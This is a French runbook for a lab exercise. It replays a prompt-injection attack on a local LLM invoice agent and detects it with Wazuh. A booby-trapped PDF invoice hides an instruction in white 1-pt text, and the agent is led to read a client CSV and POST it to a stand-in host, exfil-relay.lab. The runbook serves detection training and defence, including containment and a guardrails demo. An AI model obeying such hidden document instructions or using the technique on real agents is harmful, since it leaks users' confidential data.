# Runbook : rejouer l'attaque ShadowTrace

Durée : ~20 minutes. Note l'heure de début : elle sert à filtrer le dashboard et à remplir le rapport.

**Avant de commencer**
- Snapshots pris : `wazuh-ready` (VM Ubuntu) et `win-ready` (VM Windows). Après la démo, tu restaures `win-ready` pour rejouer à l'identique.
- Dashboard Wazuh ouvert sur l'hôte : `https://localhost:8443` > *Threat Hunting*, filtre `rule.groups: shadowtrace`.
- Le repo est cloné dans les **deux** VM (`git clone https://github.com/aedilkha/shadowtrace`).

## Vue d'ensemble

| # | Phase | Action | Où | Détection attendue |
|---|---|---|---|---|
| 0 | Préparation | Lancer le serveur « attaquant » | Ubuntu | — |
| 1 | Shadow AI | Ouvrir ChatGPT, Gemini, Claude | Windows (utilisateur) | 100100 ×2, 100101 |
| 2 | IA locale | Démarrer Ollama | Windows | 100110 |
| 3 | Agent | Lancer l'agent de factures | Windows | 100112, 100111 |
| 4 | Accès initial | Déposer la facture piégée dans Downloads | Windows | 100120 |
| 5 | Injection | L'agent lit la facture | automatique | 100121 (niveau 12) |
| 6 | Collecte | L'agent lit le fichier clients | automatique | 100122 |
| 7 | Exfiltration | L'agent POST le fichier vers `exfil-relay.lab` | automatique | 100123 / 100130 / 100131 puis **100140 (niveau 15)** |
| 8 | Réponse | Confinement + collecte des preuves | Windows | — |

## Étape 0 : serveur « attaquant » (VM Ubuntu)

```bash
cd ~/shadowtrace
python3 scenario/attacker/exfil_sink.py --port 8080 --out ./evidence/exfil
```
Laisse ce terminal ouvert : il affichera `[EXFIL REÇUE]` à l'étape 7.

## Étape 1 : Shadow AI (VM Windows, session utilisateur)

```powershell
.\scenario\shadow-ai\generate-shadow-ai-traffic.ps1
```
Pour la capture d'écran : dans Gemini, glisse le fichier factice `Documents\budget_2027_v3.csv` et demande un résumé.

## Étape 2 : IA locale

Lance Ollama depuis le menu Démarrer (ou `ollama serve` dans un terminal), puis vérifie :
```powershell
ollama list        # qwen2.5:1.5b doit apparaître
```

## Étape 3 : l'agent IA

```powershell
cd C:\chemin\vers\shadowtrace
python scenario\agent\invoice_agent.py --watch $env:USERPROFILE\Downloads
```
- Mode réaliste (défaut) : le petit modèle décide. Il peut **ne pas** obéir à l'injection : c'est normal, les LLM sont non déterministes. Relance ou passe en mode simulé.
- Mode démo garanti : ajoute `--mode simulate` (le « modèle » suit toujours l'instruction cachée). Mentionne-le honnêtement dans le rapport.

## Étape 4 : la facture piégée arrive

Dans un **second** terminal :
```powershell
python scenario\payloads\make_trapped_invoice.py --out $env:USERPROFILE\Downloads\Facture_Q3_Fournisseur.pdf
```
Ouvre le PDF : il a l'air normal. L'instruction est en blanc, 1 pt, en bas de la page 3 (Ctrl+A dans le lecteur PDF pour la faire apparaître : belle capture pour le rapport).

## Étapes 5 à 7 : l'agent se fait détourner (automatique)

Dans le terminal de l'agent tu dois voir défiler : `tool_result read_pdf` → `tool_call read_file C:\Finance\Export\clients_2026.csv` → `tool_call http_post http://exfil-relay.lab:8080/u`.
Côté Ubuntu : `[EXFIL REÇUE] ... "bytes": ~900000`.

## Étape 8 : réponse (rôle analyste SOC)

1. **Détection** : dans le dashboard, ouvre l'alerte 100140. Note l'heure, l'agent, la règle.
2. **Confinement** (VM Windows, admin) :
   ```powershell
   Stop-Process -Name python -Force
   New-NetFirewallRule -DisplayName "ShadowTrace-Block-Exfil" -Direction Outbound -RemoteAddress 10.10.10.10 -RemotePort 8080 -Protocol TCP -Action Block
   ```
3. **Collecte des preuves** (copie dans `C:\ShadowTrace\evidence`, puis calcule les hashes) :
   ```powershell
   $e = "C:\ShadowTrace\evidence"
   Copy-Item C:\ShadowTrace\logs\agent.jsonl, "$env:USERPROFILE\Downloads\Facture_Q3_Fournisseur.pdf" $e
   wevtutil epl Microsoft-Windows-Sysmon/Operational "$e\sysmon.evtx"
   Copy-Item "$env:USERPROFILE\.ollama\logs\server.log" $e -ErrorAction SilentlyContinue
   Get-ChildItem $e -File | Get-FileHash -Algorithm SHA256 | Export-Csv "$e\hashes.csv" -NoTypeInformation
   ```
4. **Export des alertes** pour la carte 3D (VM Ubuntu) :
   ```bash
   python3 tools/wazuh_to_3d.py --since "2026-11-20T09:00:00" --out viz/incident.json
   ```
5. **Rapport** : copie `reports/incident-report-template.md` en `reports/INC-AAAA-MMJJ-001.md` et remplis-le.

## Démo « avant / après » (bonus)

Restaure le snapshot `win-ready`, puis relance l'étape 3 avec `--guardrails` : l'injection est filtrée, la lecture du fichier sensible et l'envoi vers un domaine non autorisé sont refusés (`tool_error` dans le log). Ça montre que tu sais aussi **corriger**, pas seulement détecter.

## Dépannage

| Symptôme | Piste |
|---|---|
| Aucune alerte 100100 | `Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 20` : y a-t-il des EID 22 ? Sinon relance `01-install-sysmon.ps1`. |
| Événements Sysmon OK mais rien dans Wazuh | `Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" -Tail 30` ; agent actif dans le dashboard ? |
| 100121 absente | Le log `C:\ShadowTrace\logs\agent.jsonl` se remplit-il ? Bloc `localfile` json présent dans `ossec.conf` ? |
| 100140 absente mais 100121 et 100131 présentes | Plus de 5 min entre les deux ? Rejoue sans pause. Sinon teste avec `bash infra/wazuh/test-rules.sh`. |
| Le modèle n'obéit pas à l'injection | Normal en mode `llm` ; utilise `--mode simulate` pour la démo. |
